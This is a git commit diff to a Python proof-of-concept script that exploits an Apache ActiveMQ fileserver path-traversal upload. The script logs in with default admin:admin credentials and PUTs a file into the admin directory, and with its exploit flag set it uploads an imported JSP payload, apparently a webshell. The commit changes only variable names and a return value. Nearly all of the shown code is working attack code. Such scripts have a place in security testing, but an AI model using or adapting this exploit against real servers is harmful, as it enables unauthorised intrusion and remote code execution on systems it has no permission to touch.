5d7b5c0ff69cd5d4280a61c94fc87916ff045057
Xyntax <xyntax@163.com>
2016-07-19 16:42:51 -0400

    fix bug in activemq-upload

--- script/activemq-upload.py
+++ script/activemq-upload.py
@@ -18,11 +18,11 @@ from plugin.static import JSP_UPLOAD
 ENABLE_EXP = False
 
 
-def poc(url):
-    url = "http://" + url if '://' not in url else url
+def poc(base):
+    base = "http://" + base if '://' not in base else base
     name = randomString(5)
-    uri = '{url}/admin/{name}.jsp'.format(url=url.rstrip('/'), name=name)
-    target = r'{url}/fileserver/sex../../..\admin/{name}.jsp'.format(url=url.rstrip('/'), name=name)
+    uri = '{url}/admin/{name}.jsp'.format(url=base.rstrip('/'), name=name)
+    target = r'{url}/fileserver/sex../../..\admin/{name}.jsp'.format(url=base.rstrip('/'), name=name)
     key = base64.b64encode("admin:admin")
     headers = {'Authorization': 'Basic %s}' % key, 'User-Agent': 'Mozilla/5.0 Gecko/20100101 Firefox/45.0'}
     put_data = JSP_UPLOAD if ENABLE_EXP else randomString(10)
@@ -32,7 +32,7 @@ def poc(url):
         if res1.status_code == 204 and res2.status_code == 200:
             if ENABLE_EXP:
                 return uri
-            return url if put_data in res2.content else False
+            return uri if put_data in res2.content else False
     except Exception, error:
         # print error
         return False
